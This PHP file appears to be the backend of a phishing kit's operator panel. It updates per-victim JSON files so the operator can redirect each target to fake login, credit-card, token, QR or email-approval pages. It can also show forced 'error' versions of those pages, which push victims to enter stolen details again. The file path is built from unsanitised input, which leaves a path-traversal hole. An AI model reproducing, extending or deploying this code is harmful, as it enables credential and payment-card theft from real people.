<?php

    function added($target, $to) {
        $file_name = $target;
        $jsonFilePath = "../panel/storage/{$file_name}.json";
        $json_data = file_get_contents($jsonFilePath);
        $user_data = json_decode($json_data, true);
        $user_data['redirect_user'] = $to;
        if($to === "login"){
            $user_data['error_login'] = 0;
        }
        elseif($to === "login-error"){
            $user_data['error_login'] = 1;
        }
        elseif($to === "information"){
            $user_data['error_information'] = 0;
        }
        elseif($to === "information-error"){
            $user_data['error_information'] = 1;
        }
        elseif($to === "credit-card"){
            $user_data['error_credit_card'] = 0;
        }
        elseif($to === "credit-card-error"){
            $user_data['error_credit_card'] = 1;
        }
        elseif($to === "token"){
            $user_data['error_token'] = 0;
        }
        elseif($to === "token-error"){
            $user_data['error_token'] = 1;
        }
        elseif($to === "email-approvation"){
            $user_data['error_email_approvation'] = 0;
        }
        elseif($to === "email-approvation-error"){
            $user_data['error_email_approvation'] = 1;
        }
        $updated_json_data = json_encode($user_data);
        file_put_contents($jsonFilePath, $updated_json_data);
    }

    function added_qr($target, $to, $qr_target) {
        $file_name = $target;
        $jsonFilePath = "../panel/storage/{$file_name}.json";
        $json_data = file_get_contents($jsonFilePath);
        $user_data = json_decode($json_data, true);
        $user_data['redirect_user'] = $to;
        $user_data['QR_image_target'] = $qr_target;
        
        if($to === "qr"){
            
            $user_data['error_QR'] = 0;
        }
        elseif($to === "qr-error"){
            
            $user_data['error_QR'] = 1;
        }

        $updated_json_data = json_encode($user_data);
        file_put_contents($jsonFilePath, $updated_json_data);
    }

    function added_other_extra($target, $to, $extra_information) {
        $file_name = $target;
        $jsonFilePath = "../panel/storage/{$file_name}.json";
        $json_data = file_get_contents($jsonFilePath);
        $user_data = json_decode($json_data, true);
        $user_data['redirect_user'] = $to;
        $user_data['extra_information'] = $extra_information;

        if($to === "extra-information"){
            $user_data['error_extra_information'] = 0;
        }
        elseif($to === "extra-information-error"){
            $user_data['error_extra_information'] = 1;
        }

        $updated_json_data = json_encode($user_data);
        file_put_contents($jsonFilePath, $updated_json_data);
    }

    function added_other($target, $to, $current_page, $userStatus) {
        $file_name = $target;
        $jsonFilePath = "../panel/storage/{$file_name}.json";
        $json_data = file_get_contents($jsonFilePath);
        $user_data = json_decode($json_data, true);
        $user_data['redirect_user'] = $to; 
        $user_data['current_page'] = $current_page; 
        $user_data['userStatus'] = $userStatus; 
        $updated_json_data = json_encode($user_data);
        file_put_contents($jsonFilePath, $updated_json_data);
    }

?>